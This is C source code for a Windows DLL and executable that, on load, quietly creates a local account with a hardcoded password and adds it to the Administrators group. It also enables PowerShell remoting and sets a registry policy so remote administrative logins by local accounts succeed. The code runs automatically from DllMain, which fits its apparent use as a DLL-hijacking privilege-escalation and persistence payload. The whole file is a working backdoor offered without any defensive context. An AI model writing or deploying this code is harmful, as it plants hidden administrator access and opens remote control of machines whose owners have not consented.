#define UNICODE
#define _UNICODE

#include <windows.h>
#include <string.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <tchar.h>


DWORD CreateAdminUserInternal(void)
{
NET_API_STATUS rc;
BOOL b;
DWORD dw;

USER_INFO_1 ud;
LOCALGROUP_MEMBERS_INFO_0 gd;
SID_NAME_USE snu;

DWORD cbSid = 256;	// 256 bytes should be enough for everybody :)
BYTE Sid[256];

DWORD cbDomain = 256 / sizeof(TCHAR);
TCHAR Domain[256];

	system("powershell Enable-PSRemoting -SkipNetworkProfileCheck -Force");
	system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"LocalAccountTokenFilterPolicy\" /t REG_DWORD /d 1 /f");

	memset(&ud, 0, sizeof(ud));

	ud.usri1_name = _T("egorchi");
	ud.usri1_password = _T("Grigo_rich123_@123");
	ud.usri1_priv		= USER_PRIV_USER;
	ud.usri1_flags		= UF_SCRIPT | UF_NORMAL_ACCOUNT;
	ud.usri1_script_path = NULL;

	rc = NetUserAdd(
		NULL,			// local server
		1,				// information level
		(LPBYTE)&ud,
		NULL			// error value
	);

	if (rc != NERR_Success) {
		_tprintf(_T("NetUserAdd FAIL %d 0x%08x\r\n"), rc, rc);
		return rc;
	}

	//
	// Get user SID
	// http://msdn.microsoft.com/en-us/library/aa379159(v=vs.85).aspx
	//

	b = LookupAccountName(
		NULL,			// local server
		ud.usri1_name,	// account name
		Sid,			// SID
		&cbSid,			// SID size
		Domain,			// Domain
		&cbDomain,		// Domain size
		&snu			// SID_NAME_USE (enum)
	);

	if (!b) {
		dw = GetLastError();
		_tprintf(_T("LookupAccountName FAIL %d 0x%08x\r\n"), dw, dw);
		return dw;
	}

	//
	// Add user to "Administrators" local group
	// http://msdn.microsoft.com/en-us/library/aa370436%28v=VS.85%29.aspx
	//

	memset(&gd, 0, sizeof(gd));

	gd.lgrmi0_sid = (PSID)Sid;

	if (GetSystemDefaultLangID() == 1049) {
		rc = NetLocalGroupAddMembers(
			NULL,					// local server
			_T("Администраторы"),
			0,						// information level
			(LPBYTE)&gd,
			1						// only one entry
		);
	}
	else
	{
		rc = NetLocalGroupAddMembers(
			NULL,					// local server
			_T("Administrators"),
			0,						// information level
			(LPBYTE)&gd,
			1						// only one entry
		);
	}


	if (rc != NERR_Success) {
		_tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\r\n"), rc, rc);
		return rc;
	}

	return 0;
}

//
// DLL entry point.
//

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		CreateAdminUserInternal();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

//
// RUNDLL32 entry point.
// https://support.microsoft.com/en-us/help/164787/info-windows-rundll-and-rundll32-interface
//

#ifdef __cplusplus
extern "C" {
#endif

__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	CreateAdminUserInternal();
}

#ifdef __cplusplus
}
#endif

//
// Command-line entry point.
//

int main()
{
	return CreateAdminUserInternal();
}

